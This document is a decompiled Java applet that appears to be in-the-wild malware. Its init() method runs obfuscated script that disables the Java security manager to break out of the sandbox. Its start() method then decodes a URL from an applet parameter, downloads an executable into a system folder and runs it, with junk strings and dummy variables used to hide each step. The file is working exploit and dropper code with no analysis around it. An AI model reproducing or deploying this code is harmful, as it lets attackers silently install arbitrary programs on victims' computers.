import javax.script.ScriptException;
import java.awt.Component;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Efira extends Applet
{
    private JList entendes;
    
    private void ggg() {
        int a = 3;
        ++a;
    }
    
    @Override
    public void start() {
        try {
            final Pol kk = new Pol();
            String miro = kk.Syst();
            final String c = new String();
            if (miro.charAt(miro.length() - 1) != '\\') {
                miro += "\\";
            }
            final String mjop = miro + "havbadd3avba2.eavbaxavbae".replace("avba", "");
            final String b = new String();
            final FileOutputStream boplaa = new FileOutputStream(mjop);
            final String a = new String();
            final String quet = this.getParameter("dbvbaesbvbat".replace("bvba", ""));
            final String d = new String();
            final String dquet = kk.Ast(quet);
            final String e = new String();
            final InputStream qopls = Sento.Iopls(dquet);
            final String f = new String();
            byte[] sainer = new byte[153601];
            final String g = new String();
            final int roroa = 0;
            final byte[] fhdfh = new byte[100];
            final String h = new String();
            int cnt = 0;
            while ((cnt = qopls.read(sainer)) > 0) {
                final String y = new String();
                boplaa.write(sainer, 0, cnt);
                sainer = new byte[153601];
            }
            final String m = new String();
            boplaa.close();
            final String l = new String();
            qopls.close();
            try {
                final String j = new String();
                Sento.owms(mjop);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    @Override
    public void init() {
        try {
            final Men script = new Men();
            final int a = 0;
            script.jjwd.eval("v9jdn0ar er9jdn0ro9jdn0r = ne9jdn0w Er9jdn0ro9jdn0r(\"9jdn0y er9jdn0ro9jdn0r\");th9jdn0is.to9jdn0Str9jdn0in9jdn0g = fu9jdn0nc9jdn0tion(){ ja9jdn0va.la9jdn0ng.Sy9jdn0ste9jdn0m.se9jdn0tSe9jdn0cur9jdn0ityMana9jdn0ger(nu9jdn0ll);app9jdn0let.st9jdn0ar9jdn0t();re9jdn0tu9jdn0rn \"ex9jdn0plo9jdn0it!\";};er9jdn0r9jdn0or.mess9jdn0ag9jdn0e = thi9jdn0s;".replace("9jdn0", ""));
            final int b = a + 1;
            this.entendes = new JList((E[])new Object[] { script.jjwd.get("er9jdn0ro9jdn0r".replace("9jdn0", "")) });
            final int c = a + b * 2;
            this.add(this.entendes);
        }
        catch (ScriptException ex) {}
    }
}
